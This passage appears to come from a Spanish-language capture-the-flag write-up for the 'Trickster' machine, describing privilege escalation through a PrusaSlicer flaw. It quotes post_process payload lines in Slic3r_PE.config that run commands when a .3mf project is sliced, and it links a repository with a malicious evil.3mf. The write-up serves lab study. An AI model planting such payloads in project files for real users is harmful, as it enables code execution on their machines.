<br>Vemos que se puede ejecutar código<br>arbitrario mirando la versión del programa en <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a><br><br>Segun <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a>:<br>For the linux PoC, this CLI command is enough to execute the payload contained in the project. './prusa-slicer -s code-exec-linux.3mf'. After slicing, a new file '/tmp/hax' will be created. This particular PoC contains this 'post_process' entry in the 'Slic3r_PE.config' file:  <br>El exploit  permite la ejecución de código arbitrario al manipular el archivo Slic3r_PE.config dentro de un proyecto .3mf de PrusaSlicer.<br>El archivo Slic3r_PE.config es donde se define la configuración del proyecto y contiene la entrada post_process, que se utiliza para ejecutar scripts después de generar el archivo G-code. En este caso, modificaremos esta entrada para incluir nuestro payload .<br>Slic3r_PE.config:<br>; post_process = "/usr/bin/id &gt; /tmp/hax #\necho 'arbitrary code execution! (x_x)'&gt;&gt; /tmp/hax #"
<br><br>En el siguiente repositorio de github ya tenemos un archivo .3mf malicioso<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/suce0155/prusaslicer_exploit.git" target="_blank">https://github.com/suce0155/prusaslicer_exploit.git</a><br>Lo descomprimimos y observamos el arbol de directorio de los archivos .3mf y como este ejecuta el codigo arbitrario;<br>Para extraerlo usamos unzip o 7z cualquiera vale;<br>total 64K
drwxrwxr-x 4 kali kali 4,0K feb 14 20:00 .
drwxrwxr-x 6 kali kali 4,0K feb 14 19:52 ..
-rw-rw-r-- 1 kali kali  39K feb 14 19:52 evil.3mf
-rw-rw-r-- 1 kali kali   42 feb 14 19:52 exploit.sh
drwxrwxr-x 5 kali kali 4,0K feb 14 20:00 Extracted
drwxrwxr-x 8 kali kali 4,0K feb 14 19:52 .git
-rw-rw-r-- 1 kali kali  369 feb 14 19:52 README.md
➜  prusaslicer_exploit git:(main) ✗ tree Extracted 
Extracted
├── 3D
│   └── 3dmodel.model
├── [Content_Types].xml
├── Metadata
│   ├── Slic3r_PE.config
│   ├── Slic3r_PE_model.config
│   └── thumbnail.png
└── _rels

4 directories, 5 files

<br>El exploit esta en el archivo Slic3r_PE.config que es el que ejecuta codigo arbitrario<br> cat Extracted/Metadata/Slic3r_PE.config | grep tmp
; post_process = "chmod +x /tmp/exploit.sh";"bash /tmp/exploit.sh"
<br>El exploit le da permiso a un archivo /tmp/exploit.sh y lo ejecuta con bash]]></description><link>machines/trickster/2.privesc.html</link><guid isPermaLink="false">Machines/Trickster/2.PrivEsc.md</guid><pubDate>Fri, 14 Feb 2025 19:05:14 GMT</pubDate><enclosure url="machines/trickster/imgs/pasted-image-20250213163524.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/trickster/imgs/pasted-image-20250213163524.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>